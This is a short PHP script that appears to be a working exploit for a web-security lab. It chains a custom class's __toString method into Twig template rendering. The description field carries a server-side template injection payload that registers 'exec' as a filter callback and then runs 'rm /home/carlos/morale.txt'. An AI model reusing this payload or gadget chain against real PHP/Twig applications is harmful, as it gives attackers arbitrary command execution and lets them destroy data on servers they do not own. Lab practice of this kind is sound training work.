<?php
require_once('vendor/autoload.php');
class test{
	private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }
	public	function isTemplateLocked() {
		echo "test";
		echo $this->lockFilePath();
		echo "again";
        return file_exists($this->lockFilePath());
       }
	private function lockFilePath()
	{
		echo $this->template_file_path;
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
$test = new blog("user",'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}');
$ok = new test($test);
echo "test".$test.".lock";


Class blog{
public $user;
    public $desc;
public $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }
public function __toString() {
	$loader = new Twig_Loader_Array([
            'index' => $this->desc,
	]);
	print_r($loader);
	$this->twig = new Twig_Environment($loader);
        return $this->twig->render('index', ['user' => $this->user]);
    }
}

?>
